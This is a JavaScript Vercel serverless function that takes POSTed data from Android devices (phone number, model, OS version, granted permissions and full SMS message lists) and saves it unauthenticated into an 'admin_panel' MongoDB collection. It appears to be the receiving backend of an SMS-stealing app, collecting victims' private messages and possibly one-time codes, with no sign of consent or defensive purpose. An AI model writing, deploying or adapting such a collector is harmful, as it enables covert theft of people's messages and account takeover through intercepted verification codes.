// Vercel serverless function to receive SMS data
import { MongoClient } from 'mongodb';

const MONGODB_URI = process.env.MONGODB_URI;
const client = new MongoClient(MONGODB_URI);

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const {
      device_phone,
      device_model,
      android_version,
      install_time,
      permissions_granted,
      sms_messages
    } = req.body;
    
    await client.connect();
    const db = client.db('admin_panel');
    const collection = db.collection('user_installations');
    
    const result = await collection.insertOne({
      device_phone,
      device_model,
      android_version,
      install_time,
      permissions_granted,
      sms_messages,
      created_at: new Date()
    });
    
    await client.close();
    
    res.status(200).json({ 
      status: 'success', 
      message: 'Data saved successfully',
      id: result.insertedId
    });
    
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ 
      status: 'error', 
      message: 'Failed to save data' 
    });
  }
}
